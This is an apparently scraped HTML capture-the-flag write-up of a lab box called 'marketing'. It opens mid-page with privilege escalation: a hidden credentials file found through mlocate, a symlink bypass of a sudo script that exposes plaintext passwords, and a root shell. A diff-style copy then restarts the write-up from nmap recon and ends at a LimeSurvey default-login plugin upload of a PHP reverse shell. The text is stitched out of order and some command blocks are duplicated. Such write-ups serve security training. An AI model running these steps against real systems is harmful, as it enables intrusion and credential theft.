0.1px;">t.miller@marketing:/tmp<span class="cm-def">$ find</span> / <span class="cm-attribute">-group</span> mlocate <span class="cm-number">2</span>&gt;/dev/null</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/var/lib/mlocate/mlocate.db</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/usr/bin/mlocate</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 66px;"></div><div class="CodeMirror-gutters" style="display: none; height: 66px;"></div></div></div></pre><p><img src="./marketing.assets/image-20260208152351325.png" alt="image-20260208152351325"></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">t.miller@marketing:/tmp<span class="cm-def">$ cat</span> mlocate_copy | <span class="cm-builtin">grep</span> m.sander</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Binary file (standard input) matches</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 44px;"></div><div class="CodeMirror-gutters" style="display: none; height: 44px;"></div></div></div></pre><p><span>I examined the </span><code>mlocate.db</code><span> file using </span><code>grep -a</code><span> (to treat the binary as text), which exposed a hidden file: </span><code>/home/m.sander/personal/creds-for-2022.txt</code><span> .</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">t.miller@marketing:/tmp<span class="cm-def">$ cat</span> mlocate_copy | <span class="cm-builtin">grep</span> <span class="cm-attribute">-a</span> m.sander</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 22px;"></div><div class="CodeMirror-gutters" style="display: none; height: 22px;"></div></div></div></pre><p><img src="./marketing.assets/image-20260208152356677.png" alt="image-20260208152356677"></p><p><span>The script blocks any path containing the string “</span><strong><span>m.sander.</span></strong><span>” To bypass this, I created a </span><strong><span>symbolic link</span></strong><span> in my current directory pointing to the credentials file </span><code>creds-for-2022.txt</code><span> .</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">t.miller@marketing:~<span class="cm-def">$ ln</span> <span class="cm-attribute">-s</span> /home/m.sander/personal/creds-for-2022.txt a_symlink</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 22px;"></div><div class="CodeMirror-gutters" style="display: none; height: 22px;"></div></div></div></pre><p><span>Since the link name did not contain the forbidden string, the script processed it, and the </span><code>diff</code><span> output revealed the passwords.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">t.miller@marketing:~<span class="cm-def">$ sudo</span> <span class="cm-attribute">-u</span> m.sander /usr/bin/sync.sh a_symlink </span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Difference: <span class="cm-number">1</span>,3c1,8</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; <span class="cm-operator">==</span> NOTES <span class="cm-operator">==</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; <span class="cm-attribute">-</span> remove vhost from website (done)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; <span class="cm-attribute">-</span> update to newer version (todo)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">\\ No newline at end of file</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">---</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; slack account:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; michael_sander@gmail.com <span class="cm-attribute">-</span> pa<span class="cm-def">$$word</span>@123<span class="cm-def">$$4</span>!!</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; github:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; michael_sander@gmail.com <span class="cm-attribute">-</span> EzPwz2022_dev1<span class="cm-def">$$23</span>!!</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; gmail:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; michael_sander@gmail.com <span class="cm-attribute">-</span> EzPwz2022_12345678<span class="cm-comment">#!</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">\\ No newline at end of file</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-operator">+</span>] Updated.</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 373px;"></div><div class="CodeMirror-gutters" style="display: none; height: 373px;"></div></div></div></pre><h1 id='shell-as-msander'><span>Shell as </span><code>m.sander</code></h1><p><span>After logging in as </span><code>m.sander</code><span> , I checked the sudo permissions and found that the user had full sudo privileges (</span><code>ALL:ALL</code><span>).</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">t.miller@marketing:~<span class="cm-def">$ su</span> m.sander</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Password: </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">To run a command as administrator (user <span class="cm-string">"root"</span>), use <span class="cm-string">"sudo &lt;command&gt;"</span>.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">See <span class="cm-string">"man sudo_root"</span> <span class="cm-keyword">for</span> details.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">m.sander@marketing:/home/t.miller<span class="cm-def">$ whoami</span>;id;hostname</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">m.sander</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">uid</span><span class="cm-operator">=</span><span class="cm-number">1001</span>(m.sander) <span class="cm-def">gid</span><span class="cm-operator">=</span><span class="cm-number">1001</span>(m.sander) <span class="cm-def">groups</span><span class="cm-operator">=</span><span class="cm-number">1001</span>(m.sander),24(cdrom),27(sudo),46(plugdev),50(staff),100(users),119(mlocate)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">marketing</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 197px;"></div><div class="CodeMirror-gutters" style="display: none; height: 197px;"></div></div></div></pre><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">m.sander@marketing:/home/t.miller<span class="cm-def">$ sudo</span> <span class="cm-attribute">-l</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[sudo] password <span class="cm-keyword">for</span> m.sander: </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Matching Defaults entries <span class="cm-keyword">for</span> m.sander on marketing:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  env_reset, mail_badpass, <span class="cm-def">secure_path</span><span class="cm-operator">=</span>/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">User m.sander may run the following commands on marketing:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  (ALL : ALL) ALL</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 154px;"></div><div class="CodeMirror-gutters" style="display: none; height: 154px;"></div></div></div></pre><h1 id='shell-as-root'><span>Shell as </span><code>root</code></h1><p><span>I executed </span><code>sudo /bin/bash -p</code><span> to obtain a root shell and completed the challenge.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">m.sander@marketing:/home/t.miller<span class="cm-def">$ sudo</span> <span class="cm-attribute">-l</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[sudo] password <span class="cm-keyword">for</span> m.sander: </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Matching Defaults entries <span class="cm-keyword">for</span> m.sander on marketing:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  env_reset, mail_badpass, <span class="cm-def">secure_path</span><span class="cm-operator">=</span>/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">User m.sander may run the following commands on marketing:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  (ALL : ALL) ALL</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 154px;"></div><div class="CodeMirror-gutters" style="display: none; height: 154px;"></div></div></div></pre><p><span>Found </span><code>proof.txt</code></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root@marketing:~<span class="cm-comment"># cat proof.txt</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">b2b...</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 44px;"></div><div class="CodeMirror-gutters" style="display: none; height: 44px;"></div></div></div></pre></div></div>
+<body>
+<a class="home-link" href="../../../index.html">🏠 Home</a>
+<div class="page">
+<div class="byline">Write-up by wook413</div>
+<div class="toc">
+<ul>
+<li><a href="#recon">Recon</a><ul>
+<li><a href="#nmap">Nmap</a></li>
+</ul>
+</li>
+<li><a href="#initial-access">Initial Access</a><ul>
+<li><a href="#http-80">HTTP 80</a></li>
+</ul>
+</li>
+<li><a href="#shell-as-www-data">Shell as www-data</a></li>
+<li><a href="#shell-as-tmiller">Shell as t.miller</a></li>
+<li><a href="#privilege-escalation">Privilege Escalation</a></li>
+<li><a href="#shell-as-msander">Shell as m.sander</a></li>
+<li><a href="#shell-as-root">Shell as root</a></li>
+</ul>
+</div>
+<h1 id="recon">Recon</h1>
+<h2 id="nmap">Nmap</h2>
+<p>As a standard procedure, I initiated 3 different <code>Nmap</code> scans. The first covered all 65,535 TCP ports to ensure no service was missed. The second was a targeted service scan on identified ports to determine versions, and the third focused on the top 10 UDP ports.</p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/Desktop]
+└─$ nmap $IP -Pn -n --open --min-rate 3000 -p-
+Starting Nmap 7.95 ( &lt;https://nmap.org&gt; ) at 2026-01-27 18:49 UTC
+Nmap scan report for 192.168.170.225
+Host is up (0.051s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 16.22 seconds
+</code></pre>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/Desktop]
+└─$ nmap $IP -sC -sV -p 22,80                                             
+Starting Nmap 7.95 ( &lt;https://nmap.org&gt; ) at 2026-01-27 18:50 UTC
+Nmap scan report for 192.168.170.225
+Host is up (0.045s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
+|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
+|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: marketing.pg - Digital Marketing for you!
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .
+Nmap done: 1 IP address (1 host up) scanned in 8.38 seconds
+</code></pre>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/Desktop]
+└─$ nmap $IP -sU --top-ports 10
+Starting Nmap 7.95 ( &lt;https://nmap.org&gt; ) at 2026-01-27 18:51 UTC
+Nmap scan report for 192.168.170.225
+Host is up (0.045s latency).
+
+PORT     STATE         SERVICE
+53/udp   open|filtered domain
+67/udp   closed        dhcps
+123/udp  closed        ntp
+135/udp  closed        msrpc
+137/udp  closed        netbios-ns
+138/udp  closed        netbios-dgm
+161/udp  closed        snmp
+445/udp  closed        microsoft-ds
+631/udp  open|filtered ipp
+1434/udp closed        ms-sql-m
+
+Nmap done: 1 IP address (1 host up) scanned in 5.10 seconds
+</code></pre>
+<h1 id="initial-access">Initial Access</h1>
+<h2 id="http-80">HTTP 80</h2>
+<p>I mapped the target IP address to <code>marketing.pg</code> in the <code>/etc/hosts</code> file for easier navigation.</p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/Desktop]
+└─$ echo '192.168.170.225 marketing.pg' | sudo tee -a /etc/hosts
+[sudo] password for kali: 
+192.168.170.225 marketing.pg
+</code></pre>
+<p>Only ports 22 and 80 were open. For the HTTP service, I ran the <code>http-enum</code> Nmap script for quick wins, which revealed <code>/old</code> and <code>/vendor</code> directories.</p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/Desktop]
+└─$ nmap $IP -sV --script=http-enum -p 80        
+Starting Nmap 7.95 ( &lt;https://nmap.org&gt; ) at 2026-01-27 18:52 UTC
+Nmap scan report for 192.168.170.225
+Host is up (0.046s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| http-enum: 
+|   /old/: Potentially interesting folder
+|_  /vendor/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
+
+Service detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .
+Nmap done: 1 IP address (1 host up) scanned in 13.48 seconds
+</code></pre>
+<p>Although the <code>index.html</code> files in the root and <code>/old</code> appeared identical, I discovered a hidden link to <code>customers-survey.marketing.pg</code> within the source code of the <code>/old</code> page.</p>
+<p><img alt="image-20260208152241451" src="./marketing.assets/image-20260208152241451.png" /></p>
+<pre><code>/old
+</code></pre>
+<p><img alt="image-20260208152247571" src="./marketing.assets/image-20260208152247571.png" /></p>
+<p><img alt="image-20260208152253203" src="./marketing.assets/image-20260208152253203.png" /></p>
+<p>I added this subdomain to my <code>/etc/hosts</code> file as well.</p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/Desktop]
+└─$ echo '192.168.170.225 customers-survey.marketing.pg' | sudo tee -a /etc/hosts
+192.168.170.225 customers-survey.marketing.pg
+</code></pre>
+<p>Navigating to the subdomain revealed a <strong>LimeSurvey</strong> instance.</p>
+<p><img alt="image-20260208152259295" src="./marketing.assets/image-20260208152259295.png" /></p>
+<p>Using <code>gobuster</code> for directory brute-forcing and researching for default credentials, I successfully logged in as <code>admin:password</code> .</p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/Desktop]
+└─$ gobuster dir -u &lt;http://customers-survey.marketing.pg&gt; -w /usr/share/seclists/Discovery/Web-Content/common.txt -b 403,404
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     &lt;http://customers-survey.marketing.pg&gt;
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   403,404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/LICENSE              (Status: 200) [Size: 49474]
+/admin                (Status: 301) [Size: 346] [--&gt; &lt;http://customers-survey.marketing.pg/admin/&gt;]
+/assets               (Status: 301) [Size: 347] [--&gt; &lt;http://customers-survey.marketing.pg/assets/&gt;]
+/index.php            (Status: 200) [Size: 47972]
+/installer            (Status: 301) [Size: 350] [--&gt; &lt;http://customers-survey.marketing.pg/installer/&gt;]
+/modules              (Status: 301) [Size: 348] [--&gt; &lt;http://customers-survey.marketing.pg/modules/&gt;]
+/package.json         (Status: 200) [Size: 62]
+/plugins              (Status: 301) [Size: 348] [--&gt; &lt;http://customers-survey.marketing.pg/plugins/&gt;]
+/tests                (Status: 301) [Size: 346] [--&gt; &lt;http://customers-survey.marketing.pg/tests/&gt;]
+/themes               (Status: 301) [Size: 347] [--&gt; &lt;http://customers-survey.marketing.pg/themes/&gt;]
+/tmp                  (Status: 301) [Size: 344] [--&gt; &lt;http://customers-survey.marketing.pg/tmp/&gt;]
+/upload               (Status: 301) [Size: 347] [--&gt; &lt;http://customers-survey.marketing.pg/upload/&gt;]
+Progress: 4746 / 4747 (99.98%)
+===============================================================
+Finished
+===============================================================
+</code></pre>
+<p><img alt="image-20260208152306493" src="./marketing.assets/image-20260208152306493.png" /></p>
+<p><img alt="image-20260208152311212" src="./marketing.assets/image-20260208152311212.png" /></p>
+<p><img alt="image-20260208152317584" src="./marketing.assets/image-20260208152317584.png" /></p>
+<p>I found this Github repository leveraging a plugin exploit to gain Remote Code Execution. The author also wrote the instruction on how to perform the exploit very clearly.</p>
+<p>https://github.com/Y1LD1R1M-1337/Limesurvey-RCE</p>
+<p>I created a <code>config.xml</code> and a PHP reverse shell, archived them as a ZIP file.</p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/Desktop/Limesurvey-RCE]
+└─$ zip wook.zip config.xml php-rev.php 
+  adding: config.xml (deflated 56%)
+  adding: php-rev.php (deflated 60%)
+</code></pre>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/Desktop/Limesurvey-RCE]
+└─$ unzip -l wook.zip 
+Archive:  wook.zip
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+      756  2026-01-28 01:59   config.xml
+     2430  2026-01-28 02:00   php-rev.php
+---------                     -------
+     3186                     2 files
+</code></pre>
+<p><img alt="image-20260208152326321" src="./marketing.assets/image-20260208152326321.png" /></p>
+<p>Uploaded them via <strong>Configuration → Plugins → Upload &amp; Install.</strong> Upon activating the plugin, I received a reverse shell as the <code>www-data</code> user.</p>
+<p><img alt="image-20260208152332343" src="./marketing.assets/image-20260208152332343.png" /></p>
+<h1 id="shell-as-www-data">Shell as <code>www-data</code></h1>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/Desktop]
+└─$ python3 penelope.py -p 443
